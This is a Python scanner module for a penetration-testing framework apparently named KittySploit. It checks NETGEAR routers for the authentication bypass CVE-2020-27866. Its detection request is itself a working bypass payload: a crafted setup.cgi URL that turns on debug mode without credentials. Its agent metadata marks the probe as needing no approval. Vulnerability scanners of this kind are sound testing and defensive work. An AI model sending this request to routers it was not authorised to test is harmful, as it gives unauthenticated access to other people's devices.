#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""NETGEAR R6020, R6080, R6120, R6220, R6260, R6700v2, R6800, R6900v2, R7450, JNR3210, WNR2020, Nighthawk AC2100,."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NETGEAR - Authentication Bypass Detection',
        'description': 'NETGEAR R6020, R6080, R6120, R6220, R6260, R6700v2, R6800, R6900v2, R7450, JNR3210, WNR2020, Nighthawk AC2100, and Nighthawk AC2400 routers are vulnerable to authentication bypass vulnerabilities which could allow network-adjacent attackers to bypass authentication on affected installations.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'netgear', 'auth-bypass', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wzt.ac.cn/2021/01/13/AC2400_vuln/',
            'https://www.zerodayinitiative.com/advisories/ZDI-20-1451/',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27866',
            'https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-27866',
        ],
        'cve': 'CVE-2020-27866',
    }

    def run(self):
        path = '/setup.cgi?todo=debug&x=currentsetting.htm'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Accept-Language': 'en', 'Connection': 'close'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Debug Enable!',)
        if any(m in body for m in body_any):
            self.set_info(severity='high', reason='NETGEAR - Authentication Bypass detected', path=path)
            return True
        return False

